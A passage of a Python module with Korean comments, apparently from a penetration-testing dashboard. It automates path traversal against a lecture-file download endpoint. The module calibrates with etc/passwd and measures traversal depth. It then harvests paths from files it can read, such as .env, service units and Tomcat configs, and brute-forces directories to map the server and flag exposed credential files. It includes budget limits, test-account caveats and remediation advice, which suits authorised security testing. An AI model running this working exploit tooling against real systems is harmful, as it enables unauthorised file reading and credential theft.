    found += _PATH.findall(text)                  # 본문에 그냥 적힌 것

    out, seen = [], set()
    for p in found:
        p = p.rstrip("/.,;:)")
        if not _usable(p):
            continue
        for cand in [p] + _parents(p):
            key = cand.lstrip("/")
            if key and key not in seen:
                seen.add(key)
                out.append(key)
            if len(out) >= limit:
                return out
    return out


# 어느 파일부터 읽을지 — 유닛 하나에서 5경로가 나왔다. 큰 파일은 비용만 크다.
_HARVEST_FIRST = (".service", ".timer", ".env", "crontab", "/etc/environment")
_HARVEST_NEXT = ("nginx", "sites-available", "catalina.properties", "context.xml", "server.xml")
_HARVEST_SKIP = ("dpkg/status", ".log", ".war", ".jar", "mime.types")
# JSP 앱 안쪽을 알려 주는 파일 — 풀린 WAR 의 web.xml 과 JSP 자체
_HARVEST_APP = (".jsp", ".jspf", "web-inf/web.xml")
# 이보다 큰 파일은 읽지 않는다. **이름이 아니라 크기로 가른다** — 톰캣 전역
# `conf/web.xml`(168KB)에는 경로가 없고 비용만 크지만, 앱 자신의
# `WEB-INF/web.xml` 은 작고 **페이지 이름을 적어 둔다.** 이름으로 web.xml 을
# 통째로 건너뛰면 JSP 앱 안쪽으로 들어가는 길이 막힌다(11-06).
HARVEST_MAX_SIZE = 64 * 1024


def harvest_order(nodes):
    """수확 가치가 높은 파일부터. 같은 등급이면 작은 것부터(싸다)."""
    def rank(n):
        low = n["path"].lower()
        if any(s in low for s in _HARVEST_SKIP):
            return 9
        if n.get("size", 0) > HARVEST_MAX_SIZE:
            return 9
        if any(s in low for s in _HARVEST_FIRST):
            return 0
        if any(low.endswith(s) or s in low for s in _HARVEST_APP):
            return 1          # 앱 안쪽 — 유닛 다음으로 값이 크다
        if any(s in low for s in _HARVEST_NEXT):
            return 2
        return 3
    return sorted((n for n in nodes if rank(n) < 9), key=lambda n: (rank(n), n["size"]))


# ── 오라클 교정 ───────────────────────────────────────────────
# 답을 아는 경로 네 개. 응답 코드가 뜻을 갖는지 먼저 확인한다.
# 넷 중 하나라도 틀리면 지도를 그리지 않는다 — 조용히 거짓인 그림보다 멈추는 것이 낫다.
CALIBRATION = (
    ("etc/passwd", READABLE, "읽히는 파일 → 200"),
    ("etc", EXISTS, "디렉터리 → 500"),
    ("etc/..", EXISTS, "디렉터리 뒤 '/..' → 상위로 해석돼 500"),
    ("etc/passwd/..", UNSTAT, "파일 뒤 '/..' → ENOTDIR 로 404"),
)
DEPTH_PROBE = "etc/passwd"      # 깊이를 재는 데 쓰는, 읽히는 것이 확실한 경로
MAX_DEPTH_TRY = 12


def calibrate(walker):
    """응답 코드가 뜻을 갖는지 확인한다. [(경로, 기대, 실제, 설명, 맞음)] 을 돌려준다.

    뒤 두 항목은 **종류 가리기가 의지하는 바로 그 성질**이다. 이것이 통하지 않으면
    '디렉터리' 판정 전체가 무효이므로, 트리를 그리는 것 자체가 틀린 결과가 된다.
    """
    out = []
    for path, want, why in CALIBRATION:
        if walker.auth_stop or walker.left <= 0:
            break
        walker.left -= 1
        walker.sent += 1
        klass, _ = _send(walker.t, walker.lecture, walker.depth, walker.scheme, path)
        if klass == AUTH:
            walker.auth_stop = True
            break
        out.append({"path": path, "want": want, "got": klass,
                    "why": why, "ok": klass == want})
    return out


def measure_depth(walker, probe=DEPTH_PROBE, upto=MAX_DEPTH_TRY):
    """`../` 를 몇 개 붙여야 최상위에 닿는지 센다.

    저장 폴더의 깊이만큼 올라가야 최상위에 닿는다. 모자라면 경로가 어긋나 404 가 오고,
    넘치면 최상위에 머물러 그대로 읽힌다 — 그래서 **처음 읽히는 단계가 최소값**이다.
    고정값(9)은 배포가 바뀌면 틀리고, 틀린 쪽은 전부 404 로 보여 '없는 서버' 가 된다.

    돌려주는 것: (측정값 또는 None, [(단계, 결과)])
    """
    tried = []
    for d in range(1, upto + 1):
        if walker.auth_stop or walker.left <= 0:
            break
        walker.left -= 1
        walker.sent += 1
        klass, _ = _send(walker.t, walker.lecture, d, walker.scheme, probe)
        tried.append((d, klass))
        if klass == AUTH:
            walker.auth_stop = True
            break
        if klass == READABLE:
            return d, tried
    return None, tried


# ── 어느 디렉터리부터 넓힐지 ──────────────────────────────────
# 찾은 디렉터리 전부에 사전을 뿌리면 예산이 터진다. 11-04 실측에서는 40곳 중 10곳만
# 넓혔고(743요청) 적중은 5곳에서 났다. 그 선택을 사람 감각이 아니라 규칙으로 바꾼 것이다.
#
# 적중이 난 5곳은 전부 두 조건을 같이 만족했다.
#   (a) 씨앗 사전이 그 아래를 하나도 모른다  — 사전이 할 말을 이미 한 곳은 더 때릴 값이 없다
#   (b) 수확이 알려 준 배포 경로 아래다      — 이 서버에만 있는 영역이다
# 두 조건으로 세우면 사람이 고른 10곳이 그대로 앞에 선다(검증: 누락 0).

def _seed_knows_under(path, seed_set):
    """씨앗 사전이 이 디렉터리 아래 경로를 몇 개 적고 있는가."""
    pre = path.strip("/") + "/"
    return sum(1 for s in seed_set if s.startswith(pre))


# 디렉터리 성격에 따라 이름 묶음을 가른다.
#
# `conf` 아래에 있는 것은 설정 **파일** 이름(`server.xml`)이고, 배포 루트 아래에 있는
# 것은 **디렉터리** 이름(`webapps`)이다. 209개를 한 곳에 전부 보내면 절반이 헛되고,
# 11-06 1차 실행에서 그 낭비로 8곳에 1,272요청을 써 예산이 바닥나 srv·opt 아래 31개를
# 놓쳤다. 묶음을 가르면 한 곳에 86개(폴더투) 또는 73개(파일투)만 간다.
_CONFIGISH = ("conf", "config", "etc", "settings", "WEB-INF", "classes")


def _names_for(root, names, group):
    """group 0 = 그 디렉터리 성격에 맞는 묶음, 1 = 나머지.

    가르는 기준은 이름에 점이 있는지다 — `server.xml` 은 파일, `webapps` 는 폴더.
    완벽한 기준은 아니다(`sites-available` 처럼 점 없는 설정 폴더도 있다). 그래서
    틀린 쪽을 버리지 않고 **2차 묶음으로 미룬다** — 예산이 남으면 그쪽도 돌린다.
    """
    last = root.rstrip("/").rsplit("/", 1)[-1]
    want_files = last.lower() in [c.lower() for c in _CONFIGISH]
    same = [w for w in names if ("." in w) == want_files]
    return same if group == 0 else [w for w in names if ("." in w) != want_files]


def _declared_tier(harvest_roots):
    """'설정이 선언한 배포 영역 안인가' 를 묻는 함수를 돌려준다.

    예산이 유한하므로 배포 영역을 **끝까지 파고든 뒤에** 그 밖(OS 기본 폴더)을 본다.
    """
    roots = {r.strip("/") for r in harvest_roots}

    def inside(p):
        p = p.strip("/")
        return p in roots or any(p.startswith(r + "/") for r in roots)

    return inside


def rank_dirs(dirs, seed_set, harvest_roots):
    """넓힐 순서를 정한다. 앞에 선 곳이 먼저 예산을 받는다.

    순서가 곧 예산 배분이다 — 뒤에 선 곳은 상한에 닿아 아예 안 열린다. 그래서
    키를 고르는 근거를 11-04 실측에 맞춰 둔다.
    """
    roots = {r.strip("/") for r in harvest_roots}
    scored = []
    for n in dirs:
        p = n["path"].strip("/")
        known = _seed_knows_under(p, seed_set)
        under = p in roots or any(p.startswith(r + "/") for r in roots)
        scored.append((
            0 if known == 0 else 1,     # 씨앗이 아는 곳은 뒤로 — 사전이 할 말을 이미 했다
            0 if under else 1,          # 설정이 선언한 배포 영역을 앞으로
            # 배포 영역 안에서는 **깊은 곳부터** 파고든다. 얕은 곳부터로 두면
            # srv/sesacedu/api(2단)가 모든 1단 뒤로 밀려 예산이 닿지 않는다 —
            # 11-06 2차 실행에서 api·web 안쪽 26개를 그렇게 놓쳤다. 바깥은 반대로
            # 얕은 곳이 자식이 많아 값이 좋다.
            -p.count("/") if under else p.count("/"),
            p,
        ))
    scored.sort()
    return [p for _, _, _, p in scored]


def _provenance(mine, outside):
    """트리 아래에 출처를 적는다. 그림만 보면 어느 것이 퍼징의 성과인지 알 수 없다."""
    out = ["", "   출처  퍼징이 스스로 찾음 %d개(씨앗·확장·수확)" % len(mine)]
    if outside:
        out.append("         밖에서 받아 확인만 함 %d개 — 퍼징이 찾은 것이 아니다:" % len(outside))
        out += ["           %s" % n["path"] for n in sorted(outside, key=lambda x: x["path"])]
    return "\n".join(out) + "\n"


def _as_int(value, default, low=None, high=None):
    """화면 칸에서 온 글자를 숫자로. 숫자가 아니면 기본값으로 **조용히** 떨어진다.

    칸이 자유 입력이라 `Auto`·`6.0`·`1e3`·`abc` 가 그대로 들어온다. 전에는 `int()` 가
    ValueError 를 던져 **실행이 깨지고 지도가 아예 안 나왔다**(11-06 검수에서 발견).
    """
    try:
        n = int(str(value).strip())
    except (TypeError, ValueError):
        try:
            n = int(float(str(value).strip()))      # '6.0' · '1e3' 는 살려 준다
        except (TypeError, ValueError):
            return default
    if low is not None:
        n = max(low, n)
    if high is not None:
        n = min(high, n)
    return n


def _gate_table(gates):
    return [[g["path"], LABEL.get(g["want"], g["want"]),
             LABEL.get(g["got"], g["got"]), "맞음" if g["ok"] else "틀림", g["why"]]
            for g in gates]


GATE_COLUMNS = ["교정 경로", "이래야 한다", "실제", "판정", "확인하는 성질"]


def _calibration_failed(target, lecture, scheme, depth, depth_auto, tried, gates, walker):
    """오라클이 깨졌다. 지도를 그리지 않고 왜 멈췄는지만 돌려준다."""
    wrong = [g for g in gates if not g["ok"]]
    why = []
    if all(g["got"] == UNSTAT for g in gates):
        why.append("네 경로가 **전부 404** 입니다 — 올라갈 단계가 모자라거나 "
                   "취약점이 막혔습니다. 경로 조작이 더 안 통하는 것일 수 있습니다.")
    if any(g["got"] == DENIED for g in gates):
        why.append("**403** 이 왔습니다 — 탈출 검사에 걸렸습니다. 인코딩을 바꿔 보세요.")
    if depth_auto and not tried:
        why.append("단계 측정도 못 했습니다 — 예산이 모자랐거나 첫 요청부터 막혔습니다.")
    elif depth_auto and tried and not any(k == READABLE for _, k in tried):
        why.append("1~%d 단계를 다 올라가 봤지만 `etc/passwd` 가 한 번도 읽히지 "
                   "않았습니다 — 저장 폴더가 더 깊거나 취약점이 막혔습니다."
                   % len(tried))
    return ToolResult(
        summary="오라클 교정 실패 — 지도를 그리지 않았습니다 (%d/%d 틀림, 요청 %d건)"
                % (len(wrong), len(gates), walker.sent),
        columns=GATE_COLUMNS, rows=_gate_table(gates),
        note="**일부러 멈췄습니다.** 이 모듈은 응답 코드를 뜻으로 읽습니다 — "
             "코드가 뜻을 잃으면 결과가 조용히 거짓이 됩니다. 취약점이 막혔거나 "
             "토큰이 죽으면 전부 404 로 돌아오는데, 그 그림은 '아무것도 없는 서버' 와 "
             "구별되지 않습니다. 그런 지도를 보고서에 올리는 것보다 멈추는 것이 낫습니다. "
             + (" ".join(why) if why else
                "답을 아는 경로가 기대와 다르게 왔습니다. 위 표의 '틀림' 행을 보세요.")
             + " 올라갈 단계 %s · 인코딩 %s 로 시도했습니다."
               % (("자동 측정 %s" % depth if depth_auto and tried else
                   "자동 측정 실패(자리값 %s)" % depth if depth_auto else depth), scheme))


def _auth_failed(target, lecture, scheme, walker):
    return ToolResult(
        summary="401 — 토큰이 없거나 만료됐습니다 (요청 %d건)" % walker.sent,
        columns=["확인할 것"], rows=[["대상의 인증 헤더"]],
        note="**401 을 받아 교정 중에 멈췄습니다.** 토큰이 없거나 만료됐습니다. "
             "이대로 돌리면 전부 401·404 로 보여 '아무것도 없다'는 거짓 지도가 됩니다. "
             "대상 탭에서 그 대상의 '인증 헤더' 에 `Authorization: Bearer <토큰>` 을 "
             "넣고 다시 실행하세요. 테스트 계정 토큰만 쓰세요.")


def run(target, params):
    mode = params.get("mode", "pipeline")
    scheme = params.get("scheme", "double-full")
    lecture = params.get("lecture", "123")
    # `auto`·`Auto`·`AUTO` 는 물론, **숫자가 아닌 아무 글자도** 자동으로 본다 —
    # 터뜨리는 것보다 재는 쪽이 안전하다(재기 자체가 네 요청이면 끝난다).
    depth_raw = str(params.get("depth") or "auto").strip()
    depth_given = _as_int(depth_raw, None, low=0, high=MAX_DEPTH_TRY)
    limit = _as_int(params.get("limit"), 200, low=1)
    budget = _as_int(params.get("budget"), DEFAULT_BUDGET, low=20, high=MAX_REQUESTS)

    # 앱 전체에도 요청 한도가 있다(`DASH_MAX_REQUESTS`). 그 한도를 넘기면 보내는 쪽에서
    # `BudgetExceeded` 가 올라와 **실행이 깨지고 지도가 아예 안 나온다** — 반쯤 그린
    # 트리라도 받는 것이 낫다. 그래서 앱 한도 안으로 줄이고, 줄였다는 사실을 적는다.
    app_cap, clamped = 0, 0
    try:
        if has_app_context():
            app_cap = int(current_app.config.get("MAX_REQUESTS") or 0)
    except Exception:
        app_cap = 0
    if app_cap and budget > app_cap - 5:
        clamped, budget = budget, max(20, app_cap - 5)
    want_kinds = params.get("kinds", "yes") == "yes"
    base = (params.get("base") or "").strip().strip("/")

    # 단서 — 읽힌 파일 내용에서 사람·AI 가 찾아 넣은 경로. 모듈이 스스로 찾은 것이 아니다.
    hints = _uniq((params.get("hints") or "").splitlines())

    seeds, cut = wordlists.load(params.get("wordlist", ""), limit=limit)
    names, cut_names = [], False
    if mode in ("pipeline", "expand"):
        names, cut_names = wordlists.load(params.get("names", ""), limit=limit)
    if not seeds and mode != "expand" and not hints:
        raise ValueError("씨앗 사전이 비어 있습니다. 다른 사전을 골라 주세요")
    if mode == "expand" and not base:
        raise ValueError("'확장만' 모드에서는 기준 디렉터리를 적어 주세요 (예: srv/sesacedu)")

    # 깊이를 재는 동안 쓸 임시값. 측정에 성공하면 바로 덮어쓴다.
    depth = 9 if depth_given is None else depth_given
    # 끝 교정 몫을 미리 떼어 둔다. 예산 밖으로 더 쓰면 상한(앱 한도 포함)을 넘기고,
    # 안 떼어 두면 끝 교정이 '예산이 없어' 못 돌아 **가장 중요한 확인이 생략된다.**
    walker = _Walker(target, lecture, depth, scheme, max(8, budget - len(CALIBRATION)))
    bad = 0
    stages = []          # [(이름, 때린 경로 수)] — 어느 단계가 얼마나 썼는지 보여 준다

    # ── 0단계: 올라갈 단계 측정 ──
    # 고정값은 추측이다. 모자라면 전부 404 로 와서 '없는 서버' 로 보인다.
    depth_tried, depth_auto, depth_measured = [], False, None
    if depth_given is None:
        depth_measured, depth_tried = measure_depth(walker)
        depth_auto = True
        if depth_measured:
            depth = depth_measured
            walker.depth = depth_measured

    # ── 0단계: 오라클 교정 ──
    # 응답 코드가 뜻을 갖는지 확인한다. 틀리면 지도를 그리지 않는다 —
    # 조용히 거짓인 그림이 보고서에 올라가는 것보다 멈추는 것이 낫다.
    gates = calibrate(walker)
    if walker.auth_stop:          # 토큰 문제를 '관문 못 봄' 으로 덮지 않는다
        return _auth_failed(target, lecture, scheme, walker)
    bad_gates = [g for g in gates if not g["ok"]]
    # 관문을 **다 보지 못한** 것도 통과가 아니다. 예산이 모자라거나 401 이 오면
    # calibrate() 가 모은 것만 돌려주는데, 전에는 `gates and bad_gates` 라서 못 본 관문을
    # 조용히 넘겼다 — 그러면 교정의 뜻이 사라진다(11-06 검수).
    if len(gates) < len(CALIBRATION):
        missing = {"path": "(못 봄)", "want": "—", "got": "—", "ok": False,
                   "why": "관문 %d개 중 %d개만 확인했습니다"
                          % (len(CALIBRATION), len(gates))}
        gates = list(gates) + [missing]     # 표에도 보여야 왜 멈췄는지 안다
        bad_gates = bad_gates + [missing]
    if bad_gates:
        return _calibration_failed(target, lecture, scheme, depth, depth_auto,
                                   depth_tried, gates, walker)

    # ── 단서 먼저. 사람이 일부러 넣은 것이라 예산을 못 받는 일이 없게 한다 ──
    if hints:
        walker.hit(hints, HINT)
        stages.append(("단서", len(hints)))

    rounds = _as_int(params.get("rounds"), 0, low=0) if mode != "expand" else 0
    # 이름 사전에서 '경로 조각으로 못 쓰는 줄' 은 사전의 성질이라 **한 번만** 센다.
    # 묶음을 둘로 갈라 디렉터리마다 돌리므로, 부를 때마다 더하면 수십 배로 부푼다.
    if names:
        bad = sum(1 for w in names
                  if not (w or "").strip().strip("/")
                  or "/" in (w or "").strip().strip("/")
                  or ".." in (w or "").strip().strip("/"))
    harvested_total, grown_total, expanded_dirs, loops = 0, 0, [], 0
    out_of_budget = False
    rounds_used_up = False

    if mode == "expand":
        paths, bad = _names_under(base, names or seeds)
        walker.hit(_uniq(paths), EXPAND)
        stages.append(("확장", len(paths)))
    else:
        # ── 1단계: 씨앗 ──
        # 예산을 쪼개지 않고 통째로 쓴다. 실측 적중률이 씨앗 48%(55/115) 대 사전 3%
        # 였으니, 씨앗을 깎아 사전에 주는 것은 손해다.
        picked = _uniq(seeds)
        walker.hit(picked, SEED)
        stages.append(("씨앗", len(picked)))

        # ── 2단계: 넓히기와 수확을 한 고리로 돈다 ──
        # 손으로 할 때는 '넓혀서 conf 를 찾고 → 그 아래를 또 넓히고 → 읽힌 유닛에서
        # 경로를 캐고 → 그게 또 디렉터리면 거기를 넓히고' 를 반복했다. 한 번만 넓히면
        # `/srv/sesacedu/api/conf` 는 찾아도 그 **안**은 못 본다 — conf 는 api 를
        # 넓힌 뒤에야 생기는 대상이기 때문이다. 그래서 돌려야 한다.
        seed_set = set(picked)
        picked_from, base_hint, harvest_roots = set(), "", set()
        done_work = set()                      # (디렉터리, 묶음) — 이미 보낸 몫
        # 종류 가리기에 남겨 두는 몫. 고정 비율(budget//12)로 뒀더니 11-06 4차 실행에서
        # 148건이 묶인 채 `web/webapps` 가 안 열렸다. 실제로 **아직 안 가린 노드 수**만
        # 남기면 된다 — 그만큼만 있으면 트리가 반쪽이 되지 않는다.
        if mode in ("pipeline", "seed"):
            for loops in range(1, MAX_ROUNDS + 1):
                if walker.auth_stop or walker.left <= 0:
                    break
                progress = False

                # (a) 수확 — 읽힌 설정 파일에 적힌 절대경로를 캔다.
                #     사전은 이름을 '맞혀야' 찾지만 설정 파일은 적어 놓는다.
                #     `jdk-11.0.24+8` 처럼 버전이 든 이름은 이 길로만 나온다.
                if loops <= rounds:
                    # 사람이 넣은 '단서' 의 본문에서 캔 경로는 퍼징의 성과가 아니다.
                    # 전에는 출처 검사가 없어, 단서 한 줄이 수확 한 번을 거치면
                    # '퍼징이 스스로 찾음' 으로 세탁됐다(11-06 검수).
                    fresh = [n for n in harvest_order(walker.nodes)
                             if n["class"] == READABLE and n["source"] in MINE
                             and n["path"] not in picked_from]
                    crop = []
                    for n in fresh:
                        picked_from.add(n["path"])
                        body = n.pop("_body", "") or ""
                        # CATALINA_BASE 를 먼저 잡으면 catalina.properties 의
                        # ${catalina.base} 가 풀린다
                        for p in harvest_paths(body, base_hint=base_hint):
                            if "api" in p and not base_hint and "CATALINA_BASE" in body:
                                base_hint = "/" + p
                            crop.append(p)
                        # JSP 앱 안쪽 — web.xml 의 welcome-file·jsp-file 과 JSP 의
                        # include 줄에서 페이지 이름을 캔다. `detail.jsp` 처럼 앱이
                        # 지은 이름은 어떤 사전에도 없고 이 길로만 나온다.
                        near = n["path"].strip("/").rsplit("/", 1)[0]
                        crop += harvest_jsp(body, near)
                        # 넓힐 곳을 정하는 근거는 **선언된 경로만** 쓴다. 정규식으로 주운
                        # 것까지 넣으면 /etc/crontab 의 run-parts 줄 때문에 etc/cron.*
                        # 가 배포 경로와 같은 등급을 받고, 깊이 얕은 순이라 srv/sesacedu/api
                        # 를 앞질러 예산을 먹는다 — 11-06 2차 실행에서 그렇게 됐다.
                        harvest_roots.update(harvest_declared(body, base_hint=base_hint))
                    crop = [p for p in _uniq(crop) if p not in walker.seen][:MAX_HARVEST]
                    if crop:
                        before = len(walker.nodes)
                        walker.hit(crop, HARVEST)
                        harvested_total += len(crop)
                        if len(walker.nodes) > before:
                            progress = True
                if walker.auth_stop or walker.left <= 0:
                    break

                # (b) 종류 가리기 — **수확 바로 뒤에 해야 한다.**
                #     수확이 큐에 넣은 `srv/sesacedu/api` 가 디렉터리인지를 지금 알아야
                #     이번 바퀴의 넓히기 순위에 들어간다. 이걸 바퀴 머리에서 하면 수확
                #     결과가 한 바퀴 늦게 반영되고, 그 사이 1바퀴가 예산을 엉뚱한 곳
                #     (nginx 하위 폴더)에 다 써 버린다 — 11-06 1차 실행에서 그렇게
                #     srv·opt 아래 31개를 놓쳤다.
                #
                #     '안 알아본다' 를 골랐어도 **넓히려면** 가려야 한다 — 디렉터리가
                #     어디인지 모르면 넓힐 곳이 없다. 그래서 이름 사전이 있을 때는
                #     가린다. 사전이 없으면(씨앗만) 사용자 뜻대로 건너뛴다.
                if want_kinds or names:
                    walker.sort_kinds([n for n in walker.nodes if n["kind"] is None])
                if walker.auth_stop:
                    break

                # (c) 넓히기 — 순위를 매겨 **앞에 선 곳에** 성격에 맞는 이름 묶음을 준다.
                #     전부에 조금씩 뿌리면(전에 하던 방식) 디렉터리 40곳에 이름 2개씩이
                #     돌아가 아무것도 안 걸린다.
                pending = False       # 아직 안 보낸 (디렉터리, 묶음) 이 남았는가
                if names:
                    todo = [n for n in walker.nodes
                            if n["kind"] == DIR and n["source"] in MINE]
                    order = rank_dirs(todo, seed_set, harvest_roots)
                    inside = _declared_tier(harvest_roots)

                    # 일거리를 네 칸으로 나눈다. 앞 칸을 다 쓰기 전에 뒤 칸을 건드리지
                    # 않는다 — 예산이 유한하므로 순서가 곧 배분이다.
                    #
                    #   0  배포 영역 · 성격에 맞는 이름    srv/sesacedu/api  ← conf·webapps
                    #   1  배포 영역 · 나머지 이름
                    #   2  그 밖      · 성격에 맞는 이름    etc/cron.daily · usr/sbin
                    #   3  그 밖      · 나머지 이름
                    #
                    # 11-06 3차 실행에서 이 칸 구분이 없어 `etc/cron.*`·`usr/sbin` 이
                    # 24곳 중 15곳을 차지하고 2,592요청을 먹었고, 정작 `api/conf`·
                    # `web/conf` 는 끝까지 안 열렸다.
                    for tier in (0, 1):
                        for grp in (0, 1):
                            made = False
                            for root in order:
                                if inside(root) != (tier == 0):
                                    continue
                                if (root, grp) in done_work:
                                    continue
                                need = sum(1 for n in walker.nodes
                                           if n["kind"] is None) + 10
                                if walker.auth_stop or walker.left <= need:
                                    # 예산이 바닥난 것이지 '더 안 나오는' 것이 아니다.
                                    # 섞어 적으면 안 본 곳을 '없다' 로 읽는다.
                                    out_of_budget = True
                                    break
                                words = _names_for(root, names, grp)
                                done_work.add((root, grp))
                                if not words:
                                    continue
                                paths, _b = _names_under(root, words)
                                before = len(walker.nodes)
                                walker.hit(_uniq(paths), EXPAND)
                                if root not in expanded_dirs:
                                    expanded_dirs.append(root)
                                grown_total += len(paths)
                                if len(walker.nodes) > before:
                                    progress = made = True
                            if made or out_of_budget or walker.auth_stop:
                                break       # 새로 찾았으면 순위를 다시 매기고 돈다
                        if made or out_of_budget or walker.auth_stop:
                            break
                    pending = any((r, g) not in done_work
                                  for g in (0, 1) for r in order)

                # 새로 찾은 것이 없어도 **아직 안 보낸 일거리가 남아 있으면** 더 돈다.
                # 뒤 칸을 미루는 규칙 때문에, 여기서 바로 끊으면 뒤 칸이 영원히 안 돈다.
                if out_of_budget or (not progress and not pending):
                    break
            else:
                # for 가 break 없이 끝났다 = **바퀴 상한에 걸려** 잘렸다. 마지막 바퀴가
                # 새로 찾았든(progress) 할 일이 남았든(pending), 어느 쪽이든 더 돌 수
                # 있었다는 뜻이다 — `pending` 만 보면 progress 쪽을 놓친다(11-06 검수).
                rounds_used_up = True

        if grown_total:
            stages.append(("확장(%d곳)" % len(expanded_dirs), grown_total))
        if harvested_total:
            stages.append(("수확", harvested_total))

    # 본문은 여기서 버린다. `_r` 에 매달린 Response 의 .body 까지 비운다 —
    # 화면은 거기서 요청기록 번호만 읽지만, '어디에도 안 남는다' 를 말이 아니라
    # 사실로 만들어 둔다(11-06 검수).
    for n in walker.nodes:
        n.pop("_body", None)
        r = n.get("_r")
        if r is not None and getattr(r, "body", None):
            try:
                r.body = ""
            except Exception:
                pass

    # ── 종류 가리기: 아직 안 가린 것만 ──
    if want_kinds and not walker.auth_stop:
        walker.sort_kinds([n for n in walker.nodes if n["kind"] is None])

    # ── 끝에서 교정을 한 번 더 ──
    # 시작 때 통한 오라클이 **끝까지 통했다는 보장이 없다.** 중간에 WAF·속도 제한·
    # 403 벽이 서면 그 뒤 모든 탐색이 '없음' 으로 보이고, 그 지도가 '완전한 지도' 로
    # 보고된다(11-06 검수에서 재현: 400 중 18요청만 쓰고 3노드만 그렸는데 결과는
    # "교정 4/4 통과 · 새로 찾은 것이 없어 스스로 멈췄습니다" 였다).
    gates_end, bad_end = [], []
    if gates and not walker.auth_stop and walker.sent > len(CALIBRATION) * 4:
        walker.left += len(CALIBRATION)      # 처음에 떼어 둔 몫을 여기서 돌려준다
        gates_end = calibrate(walker)
        bad_end = [g for g in gates_end if not g["ok"]]
        if gates_end and len(gates_end) < len(CALIBRATION) and not bad_end:
            bad_end = [{"path": "(못 봄)", "want": "—", "got": "—", "ok": False,
                        "why": "끝 교정에서 관문 %d개 중 %d개만 확인"
                               % (len(CALIBRATION), len(gates_end))}]

    # ── 찾은 것에 '무엇인지' 를 붙인다 ──
    # 퍼징은 경로를 찾을 뿐 의미는 모른다. api.env 를 찾아 놓고 크기만 적으면
    # 보고서를 읽는 사람이 왜 중요한지 알 수 없다.
    for n in walker.nodes:
        n["note"], n["severity"] = describe(n["path"])

    nodes = walker.nodes
    auth_stop = walker.auth_stop
    sent = walker.sent
    over = walker.left <= 0
    targets = list(walker.seen)
    cut = cut or cut_names

    readable = [n for n in nodes if n["class"] == READABLE]
    dirs = [n for n in nodes if n["kind"] == DIR]
    opaque = [n for n in nodes if n["kind"] == OPAQUE]

    # 이 모듈이 스스로 찾은 것과 밖에서 온 것을 갈라 센다.
    mine = [n for n in nodes if n["source"] in MINE]
    outside = [n for n in nodes if n["source"] not in MINE]

    rows, drills = [], []
    # 때린 순서 그대로 적는다(walker.nodes 는 그 차례로 쌓인다). 경로순으로 정렬하면
    # 씨앗 → 확장 → 수확으로 찾아 들어간 과정이 사라진다. 구조는 위 트리가 보여 준다.
    for n in nodes:
        kind = {DIR: "디렉터리", OPAQUE: "못 들어감"}.get(n["kind"], "미판별")
        if n["class"] == READABLE:
            kind = "파일"
        rows.append([n["path"], n["status"],
                     _size(n["size"]) if n["class"] == READABLE else "—",
                     kind, LABEL[n["class"]], SOURCE_LABEL[n["source"]]])
        # 읽힌 파일은 '자료 다운로드 경로 조작' 도구로 넘겨 내용을 본다
        drills.append({"내용 보기": {"paths": n["path"].lstrip("/")}}
                      if n["class"] == READABLE else None)

    findings = []
    if readable or dirs:
        findings.append(Finding(
            title="경로 조작 퍼징으로 서버 구조 확인 (읽힌 파일 %d · 디렉터리 %d)"
                  % (len(readable), len(dirs)),
            severity="high",
            location=target.url + PATH.format(lecture=lecture, payload="<" + scheme + ">"),
            evidence=("인코딩 %s · 올라갈 단계 %s · 보낸 요청 %d건 · 때린 경로 %d개\n"
                      "단계: %s\n"
                      "읽힘 %d · 디렉터리 %d · 못 들어감 %d\n\n"
                      "**퍼징이 스스로 찾은 것 %d개** (씨앗·확장·수확)\n%s\n\n"
                      "%s"
                      "해석 주의: 404 였던 경로는 '없다'고 단정하지 않는다 — 상위 경로에 "
                      "탐색 권한이 없어도 404 가 온다."
                      % (scheme, depth, sent, len(targets),
                         " → ".join("%s %d개" % s for s in stages) or "—",
                         len(readable), len(dirs), len(opaque),
                         len(mine),
                         "\n".join("  %s (%s)" % (n["path"], _size(n["size"]))
                                   for n in mine if n["class"] == READABLE) or "  읽힌 파일 없음",
                         ("**단서로 받아 확인한 것 %d개** (사람·AI 가 넣은 경로 — 퍼징이 찾은 것이 아니다)\n%s\n\n"
                          % (len(outside),
                             "\n".join("  %s [%s]" % (n["path"], LABEL[n["class"]])
                                       for n in outside)) if outside else ""))),
            recommendation=("경로를 정규화(realpath)한 뒤 저장 폴더 안인지 검사하고, URL "
                            "디코딩은 먼저 한 번만 합니다. 더 나은 방법은 파일 이름을 받지 않고 "
                            "자료 번호로만 찾는 것입니다. 구조가 드러나면 다음 공격의 표적이 "
                            "좁혀지므로, 읽힌 설정 파일에 든 자격증명은 전부 교체해야 합니다."),
            response=(readable or nodes)[0]["_r"]))

    # 읽힌 민감 파일은 따로 올린다 — 트리 하나로는 'api.env 가 읽혔다' 가 묻힌다
    rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    want = rank.get(params.get("min_severity", "high"), 1) if params.get("min_severity") != "none" else -1
    for n in sorted(readable, key=lambda x: (rank.get(x["severity"], 4), x["path"])):
        if want < 0 or rank.get(n["severity"], 4) > want:
            continue
        findings.append(Finding(
            title="민감 파일 노출: %s" % n["path"],
            severity=n["severity"],
            location=target.url + PATH.format(lecture=lecture, payload="<" + scheme + ">"),
            evidence="%s · %s · 응답 %s · 출처 %s\n%s\n\n%s"
                     % (n["path"], _size(n["size"]), n["status"], SOURCE_LABEL[n["source"]],
                        n["note"] or "표에 없는 경로입니다 — 무엇인지는 사람이 확인하세요.",
                        _excerpt(n["_r"].body)),
            recommendation="이 파일이 밖에서 읽힌다면 안에 든 값(자격증명·키·내부 주소)은 "
                           "전부 노출된 것으로 보고 교체해야 합니다. 경로 조작 자체를 막는 것이 먼저입니다.",
            response=n["_r"]))

    note = ["구조 판정에는 응답 코드와 길이만 씁니다. 다만 **읽히는 파일은 거기 적힌 "
            "경로를 캐내려고 내용을 받습니다**(한 파일 %s까지). 받은 내용은 가리지 않습니다 — "
            "민감 파일 결과의 근거에 앞부분이 들어가고, 전문은 요청 기록에 그대로 남습니다."
            % _size(MAX_BODY)]
    if outside:
        note.append("**출처가 섞여 있습니다.** 표의 '출처' 열을 보세요 — "
                    "`씨앗`·`확장` 은 이 모듈이 자기 페이로드로 찾은 것이고, "
                    "`단서(밖에서)` 는 사람·AI 가 읽은 내용에서 넣어 확인만 한 것입니다. "
                    "보고서에 '퍼징으로 찾았다'고 쓸 수 있는 것은 앞의 둘뿐이고, "
                    "단서는 **무엇을 읽고 알아냈는지**까지 적어야 재현됩니다.")
    note.append("**404 를 '없음'으로 읽지 마세요.** 404 는 stat 실패이고, 상위 경로에 탐색 "
